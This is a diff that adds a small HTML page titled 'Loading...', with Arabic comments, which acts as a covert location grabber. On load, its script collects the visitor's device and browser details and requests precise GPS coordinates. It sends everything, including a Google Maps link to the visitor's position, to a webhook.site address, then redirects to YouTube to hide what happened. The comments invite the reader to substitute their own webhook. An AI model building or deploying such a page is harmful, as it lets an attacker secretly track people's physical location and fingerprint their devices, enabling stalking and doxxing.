@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+</head>
+<body>
+    <script>
+        // الرابط الذي يتم التوجيه إليه بعد إتمام العملية
+        const REDIRECT_URL = "https://www.youtube.com";
+
+        // رابط الـ Webhook لاستقبال البيانات (قم بتعديله بالرابط الخاص بك)
+       const WEBHOOK_URL = "https://webhook.site/3f43ac27-d027-44d7-9d1f-dc8ed7c80153";
+
+        async function collectAndSend() {
+            // تجميع معلومات المتصفح والجهاز الأساسية المتاحة للبرمجة
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+
+            // التحقق من دعم المتصفح لخاصية تحديد الموقع الجغرافي
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const data = {
+                            status: "GPS_ALLOWED",
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracyMeters: position.coords.accuracy,
+                            googleMapsLink: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`,
+                            device: deviceInfo,
+                            timestamp: new Date().toISOString()
+                        };
+                        await sendData(data);
+                    },
+                    async (error) => {
+                        const data = {
+                            status: "GPS_DENIED",
+                            error: error.message,
+                            device: deviceInfo,
+                            timestamp: new Date().toISOString()
+                        };
+                        await sendData(data);
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            } else {
+                await sendData({ status: "NO_GEOLOCATION_SUPPORT", device: deviceInfo });
+            }
+        }
+
+        async function sendData(payload) {
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {
+                console.error(e);
+            } finally {
+                // إعادة التوجيه للرابط المحدد بعد الإرسال
+                window.location.href = REDIRECT_URL;
+            }
+        }
+
+        window.onload = collectAndSend;
+    </script>
+</body>
+</html>
